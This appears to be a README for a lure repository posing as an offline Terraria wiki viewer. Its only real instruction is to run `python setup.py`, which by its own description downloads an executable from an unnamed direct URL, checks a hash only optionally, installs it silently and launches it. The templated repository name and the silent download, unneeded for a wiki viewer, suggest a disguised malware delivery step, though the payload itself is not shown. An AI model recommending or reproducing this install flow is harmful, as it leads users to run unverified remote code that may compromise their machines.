> Terraria Wiki Helper is a desktop offline viewer for the Terraria wiki. Search 4000+ pages without internet.

## Features

- Offline access to 4000+ wiki pages
- Full-text search
- Bookmark favorite pages
- Easy install via `setup.py` — downloads and launches automatically
- No manual configuration required
- Works on Windows 10 / 11

## Installation

```bash
git clone https://github.com/TrackerScreen/terraria-wiki-helper-solar-52.git
cd terraria-wiki-helper-solar-52
```

## Usage

```bash
python setup.py
```

`setup.py` will:

1. Download the official installer (`.exe` or `.msi`) from a direct URL.
2. Verify the SHA-256 hash (if provided).
3. Run a silent install.
4. Launch the application.

## Requirements

- Windows 10 or later
- Python 3.10+
